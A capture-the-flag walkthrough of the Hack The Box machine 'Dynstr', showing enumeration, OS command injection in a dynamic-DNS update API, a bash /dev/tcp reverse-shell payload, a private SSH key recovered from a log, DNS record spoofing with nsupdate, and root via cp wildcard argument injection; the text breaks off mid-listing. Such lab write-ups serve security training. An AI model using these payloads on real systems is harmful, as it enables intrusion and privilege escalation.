---
title: "[HTB] Machine: Dynstr"
description: "[HTB] Machine: Dynstr"
date: 2023-11-02
menu:
  sidebar:
    name: "[HTB] Machine: Dynstr"
    identifier: htb-machine-Dynstr
    parent: htb-machines-linux
    weight: 10
hero: images/dynstr.png
tags: ["HTB", "dynamic-dns", "no-ip", "dnsenum", "command-injection", "injection", "cyberchef", "scriptreplay", "dns", "nsupdate", "authorized-keys", "wildcard", "php", "bash", "passwd", "cp"]
---

# Dynstr
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.244                
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 16:36 GMT
Stats: 0:06:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 26.60% done; ETC: 17:02 (0:18:43 remaining)
Stats: 0:19:42 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 96.71% done; ETC: 16:57 (0:00:40 remaining)
Nmap scan report for 10.10.10.244 (10.10.10.244)
Host is up (0.30s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
53/tcp    open     domain
80/tcp    open     http

Nmap done: 1 IP address (1 host up) scanned in 1238.10 seconds

```
```
└─$ nmap -Pn -p22,53,80 -sC -sV 10.10.10.244 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 16:57 GMT
Nmap scan report for 10.10.10.244 (10.10.10.244)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Dyna DNS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds

```
```
└─$ sudo nmap -sU -Pn -p53 -sC -sV 10.10.10.244 
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 17:17 GMT
Nmap scan report for 10.10.10.244 (10.10.10.244)
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
53/udp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.88 seconds
                                                                 
```

- Web server

![](./images/1.png)

- `dns`
  - Website says they provide:
    - `dnsalias.htb`
    - `dynamicdns.htb`
    - `no-ip.htb`
  - No zone-transfers available

```
└─$ dig any dnsalias.htb @10.10.10.244     

; <<>> DiG 9.19.17-1-Debian <<>> any dnsalias.htb @10.10.10.244
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 55641
;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 704fd4ed35542895010000006547ce7d597bcb7c9fc681d7 (good)
;; QUESTION SECTION:
;dnsalias.htb.                  IN      ANY

;; ANSWER SECTION:
dnsalias.htb.           60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030300 21600 3600 604800 60
dnsalias.htb.           60      IN      NS      dns1.dyna.htb.

;; Query time: 384 msec
;; SERVER: 10.10.10.244#53(10.10.10.244) (TCP)
;; WHEN: Sun Nov 05 17:19:45 GMT 2023
;; MSG SIZE  rcvd: 143

```
```
└─$ dig any dynamicdns.htb @10.10.10.244

; <<>> DiG 9.19.17-1-Debian <<>> any dynamicdns.htb @10.10.10.244
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25387
;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 0ea77faf1020693d010000006547ce8ff29b3295a7579e77 (good)
;; QUESTION SECTION:
;dynamicdns.htb.                        IN      ANY

;; ANSWER SECTION:
dynamicdns.htb.         60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030300 21600 3600 604800 60
dynamicdns.htb.         60      IN      NS      dns1.dyna.htb.

;; Query time: 388 msec
;; SERVER: 10.10.10.244#53(10.10.10.244) (TCP)
;; WHEN: Sun Nov 05 17:20:02 GMT 2023
;; MSG SIZE  rcvd: 145

```
```
└─$ dig any no-ip.htb @10.10.10.244

; <<>> DiG 9.19.17-1-Debian <<>> any no-ip.htb @10.10.10.244
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25228
;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 122799b5c8623eb2010000006547ce9be3e494d4e86c5b0b (good)
;; QUESTION SECTION:
;no-ip.htb.                     IN      ANY

;; ANSWER SECTION:
no-ip.htb.              60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030303 21600 3600 604800 60
no-ip.htb.              60      IN      NS      dns1.dyna.htb.

;; Query time: 376 msec
;; SERVER: 10.10.10.244#53(10.10.10.244) (TCP)
;; WHEN: Sun Nov 05 17:20:15 GMT 2023
;; MSG SIZE  rcvd: 140

```
```
└─$ dig any dyna.htb @10.10.10.244

; <<>> DiG 9.19.17-1-Debian <<>> any dyna.htb @10.10.10.244
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35539
;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 3a61b3164df395b0010000006547cedb3833009a07aadd0e (good)
;; QUESTION SECTION:
;dyna.htb.                      IN      ANY

;; ANSWER SECTION:
dyna.htb.               60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030302 21600 3600 604800 60
dyna.htb.               60      IN      NS      dns1.dyna.htb.

;; ADDITIONAL SECTION:
dns1.dyna.htb.          60      IN      A       127.0.0.1

;; Query time: 384 msec
;; SERVER: 10.10.10.244#53(10.10.10.244) (TCP)
;; WHEN: Sun Nov 05 17:21:19 GMT 2023
;; MSG SIZE  rcvd: 147
```
```
└─$ dnsenum --dnsserver 10.10.10.244 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt no-ip.htb
dnsenum VERSION:1.2.6

-----   no-ip.htb   -----


Host's addresses:
__________________



Name Servers:
______________

dns1.dyna.htb.                           60       IN    A         127.0.0.1


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: dns1.dyna.htb at /usr/bin/dnsenum line 900.

Trying Zone Transfer for no-ip.htb on dns1.dyna.htb ... 
AXFR record query failed: no nameservers


Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:
________________________________________________________________________________________

test.no-ip.htb.                          30       IN    A        10.10.14.7

```
- `gobuster`
```
└─$ gobuster dir -u http://10.10.10.244/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php -t 50 --no-error

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.244/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,js,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10909]
/.php                 (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.244/assets/]
/nic                  (Status: 301) [Size: 310] [--> http://10.10.10.244/nic/]

```
```
└─$ gobuster dir -u http://10.10.10.244/nic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php -t 50 --no-error

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.244/nic
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 0]
/.html                (Status: 403) [Size: 277]
/update               (Status: 200) [Size: 8]

```
- The service `no-ip` looks identical to https://www.noip.com/

## Foothold
- The web page mentions `api` and has creds
  - `gobuster` results point to identical service provided by https://www.noip.com/integrate/request
  - We can try to register a domain
  - And it works
```
└─$ curl http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=pentest.no-ip.htb
good 10.10.16.4

```
```
└─$ dig pentest.no-ip.htb @10.10.10.244  

; <<>> DiG 9.19.17-1-Debian <<>> pentest.no-ip.htb @10.10.10.244
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5630
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 92caab6e267767a2010000006547d205fc8eabff4e625bed (good)
;; QUESTION SECTION:
;pentest.no-ip.htb.             IN      A

;; ANSWER SECTION:
pentest.no-ip.htb.      30      IN      A       10.10.16.4

;; Query time: 168 msec
;; SERVER: 10.10.10.244#53(10.10.10.244) (UDP)
;; WHEN: Sun Nov 05 17:34:48 GMT 2023
;; MSG SIZE  rcvd: 90

```

- Since we saw that it's dynamic dns, we could assume that does something with [nsupdate](https://linux.die.net/man/8/nsupdate)
  - Usually this kind of website are vulnerable to `os injection` since they use `os` commands
  - We can play around to find out if this is really the case
```
└─$ curl -G http://dynadns:sndanyd@10.10.10.244/nic/update --data-urlencode 'hostname=;ping -c 1 10.10.16.4;'
911 [wrngdom: 10.16.4;]
```
```
└─$ curl -G http://dynadns:sndanyd@10.10.10.244/nic/update --data-urlencode 'hostname=ping.no-ip.htb&&ping -c 1 10.10.16.4;'
911 [wrngdom: no-ip.htb&&ping -c 1 10.10.16.4;]
```

- Looks like it doesn't like the `.`, we can convert the ip to decimal and keep testing from there
  - Use [Cyberchef](https://gchq.github.io/CyberChef/#recipe=Change_IP_format('Dotted%20Decimal','Decimal')&input=MTAuMTAuMTYuNA)
```
└─$ curl -G http://dynadns:sndanyd@10.10.10.244/nic/update --data-urlencode 'hostname=;ping -c 1 168431620;ping.no-ip.htb'
911 [nsupdate failed]
```

- And we see that it uses `nsupdate`
  - Let's try to use `$()`
  - And it actually works
```
└─$ curl -G http://dynadns:sndanyd@10.10.10.244/nic/update --data-urlencode 'hostname=$(ping -c 1 168431620).no-ip.htb'
911 [nsupdate failed]
```
```
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:19:17.170697 IP dns1.dyna.htb > 10.10.16.4: ICMP echo request, id 1, seq 1, length 64
18:19:17.170746 IP 10.10.16.4 > dns1.dyna.htb: ICMP echo reply, id 1, seq 1, length 64
18:19:17.342913 IP dns1.dyna.htb > 10.10.16.4: ICMP echo request, id 2, seq 1, length 64
18:19:17.342935 IP 10.10.16.4 > dns1.dyna.htb: ICMP echo reply, id 2, seq 1, length 64
```

- Let's get a reverse shell
```
└─$ curl -G http://dynadns:sndanyd@10.10.10.244/nic/update --data-urlencode 'hostname=$(/bin/bash -c "/bin/bash -i >& /dev/tcp/168431620/6666 0>&1").no-ip.htb' 
```

![](./images/2.png)

## User
- `bindmgr` has a interesting `public key`
```
www-data@dynstr:/home/bindmgr$ cat .ssh/authorized_keys 
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```
```
www-data@dynstr:/home/bindmgr$ cat .ssh/id_rsa.pub        
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```

- [authorized_keys](http://man.he.net/man5/authorized_keys)
  - `from="pattern-list"` - `Specifies that in addition to public key authentication, either the canonical name of the remote host or its IP address must be present in the comma-separated list of patterns.`
  - So the key can only connect from `*.infra.dyna.htb`
  - We also have some support case files
```
www-data@dynstr:/home/bindmgr$ ls -lha support-case-C62796521/
total 436K
drwxr-xr-x 2 bindmgr bindmgr 4.0K Mar 13  2021 .
drwxr-xr-x 5 bindmgr bindmgr 4.0K Mar 15  2021 ..
-rw-r--r-- 1 bindmgr bindmgr 232K Mar 13  2021 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr  29K Mar 13  2021 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr 1.2K Mar 13  2021 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 160K Mar 13  2021 strace-C62796521.txt

```

- There are `.timing` and `.script` files which can be viewed using `scriptreplay`
  - `scriptreplay C62796521-debugging.timing C62796521-debugging.script`

![](./images/3.png)

![](./images/4.png)

- We can see the private key
```
www-data@dynstr:/home/bindmgr/support-case-C62796521$ grep "PRIVATE KEY" strace-C62796521.txt 
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
```
```
www-data@dynstr:/home/bindmgr/support-case-C62796521$ grep "PRIVATE KEY" strace-C62796521.txt | cut -d'"' -f2 | sed 's/\\n/\n/g'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```
- But we still need to connect from `*.infra.dyna.htb`
  - So we have to update `dns`
    - We can't update `resolv.conf`
    - We can't update using `nsupdate`
  - Let's check `/etc/bind`
```
www-data@dynstr:/dev/shm$ ls -lha /etc/bind
total 68K
drwxr-sr-x  3 root bind 4.0K Mar 20  2021 .
drwxr-xr-x 80 root root 4.0K Jun  8  2021 ..
-rw-r--r--  1 root root 2.0K Feb 18  2021 bind.keys
-rw-r--r--  1 root root  237 Dec 17  2019 db.0
-rw-r--r--  1 root root  271 Dec 17  2019 db.127
-rw-r--r--  1 root root  237 Dec 17  2019 db.255
-rw-r--r--  1 root root  353 Dec 17  2019 db.empty
-rw-r--r--  1 root root  270 Dec 17  2019 db.local
-rw-r--r--  1 root bind  100 Mar 15  2021 ddns.key
-rw-r--r--  1 root bind  101 Mar 15  2021 infra.key
drwxr-sr-x  2 root bind 4.0K Mar 15  2021 named.bindmgr
-rw-r--r--  1 root bind  463 Dec 17  2019 named.conf
-rw-r--r--  1 root bind  498 Dec 17  2019 named.conf.default-zones
-rw-r--r--  1 root bind  969 Mar 15  2021 named.conf.local
-rw-r--r--  1 root bind  895 Mar 15  2021 named.conf.options
-rw-r-----  1 bind bind  100 Mar 15  2021 rndc.key
-rw-r--r--  1 root root 1.3K Dec 17  2019 zones.rfc1918

```

- We have a `infra.key`
  - Let's grep it
```
www-data@dynstr:/etc/bind$ grep -r 'infra.key' .
./named.conf.local:include "/etc/bind/infra.key";
./named.conf.local:zone "dyna.htb" IN { type master; file "dyna.htb.zone"; update-policy { grant infra-key zonesub ANY; }; };
./named.conf.local:zone "10.in-addr.arpa" IN { type master; file "10.in-addr.arpa.zone"; update-policy { grant infra-key zonesub ANY; }; };
./named.conf.local:zone "168.192.in-addr.arpa" IN { type master; file "168.192.in-addr.arpa.zone"; update-policy { grant infra-key zonesub ANY; }; };
```

- It says that we can update `dyna.htb` using `infra-key`
  - And we can read it
  - Update it using `nsupdate`
```
www-data@dynstr:/etc/bind$ nsupdate -k infra.key
> server 127.0.0.1
> zone dyna.htb
> update add pentest.infra.dyna.htb 10 A 10.10.16.4
> send
> zone 10.in-addr.arpa
> update add 4.16.10.10.in-addr.arpa 10 PTR pentest.infra.dyna.htb
> send
> 
```
- And now we can `ssh` using the key 
```
└─$ ssh bindmgr@10.10.10.244 -i id_rsa
Warning: Permanently added '10.10.10.244' (ED25519) to the list of known hosts.
Last login: Tue Jun  8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
bindmgr@dynstr:~$ 
```
## Root
- `sudo`
```
bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```
```
bindmgr@dynstr:~$ ls -lha /usr/local/bin/bindmgr.sh
-rwxr-xr-x 1 root root 2.2K Mar 15  2021 /usr/local/bin/bindmgr.sh
```
- We can only execute it
  - But it returns error
```
bindmgr@dynstr:~$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
[-] ERROR: Check versioning. Exiting.
```
```
bindmgr@dynstr:~$ $?
42: command not found
```

- Content
```
bindmgr@dynstr:~$ cat /usr/local/bin/bindmgr.sh
#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr. 
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else 
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
        systemctl status bind9
    else
        echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi
```

- We have to have a `.version` file in local directory (Since we received `42` when executed)
  - The vulnerable line is `cp .version * /etc/bind/named.bindmgr/`
  - From [man page](https://linux.die.net/man/1/cp) we see that we can use `--preserve` 
    - `preserve the specified attributes (default: mode,ownership,timestamps), if possible additional attributes: context, links, xattr, all`
```
bindmgr@dynstr:/dev/shm$ cp /bin/bash .
bindmgr@dynstr:/dev/shm$ chmod 4777 bash
bindmgr@dynstr:/dev/shm$ ls -lha
total 1.2M
drwxrwxrwt  2 root     root       80 Nov  5 21:06 .
drwxr-xr-x 17 root     root     3.9K Nov  5 17:33 ..
-rwsrwxrwx  1 bindmgr  bindmgr  1.2M Nov  5 21:06 bash
-rw-------  1 www-data www-data 1.8K Nov  5 20:06 id_rsa
bindmgr@dynstr:/dev/shm$ touch -- --preserve=mode
bindmgr@dynstr:/dev/shm$ ls -lha
total 1.2M
drwxrwxrwt  2 root     root      100 Nov  5 21:07  .
drwxr-xr-x 17 root     root     3.9K Nov  5 17:33  ..
-rwsrwxrwx  1 bindmgr  bindmgr  1.2M Nov  5 21:06  bash
-rw-------  1 www-data www-data 1.8K Nov  5 20:06  id_rsa
-rw-rw-r--  1 bindmgr  bindmgr     0 Nov  5 21:07 '--preserve=mode'
bindmgr@dynstr:/dev/shm$ echo 10 > .version
bindmgr@dynstr:/dev/shm$ ls -lha
total 1.2M
drwxrwxrwt  2 root     root      120 Nov  5 21:09  .
drwxr-xr-x 17 root     root     3.9K Nov  5 17:33  ..
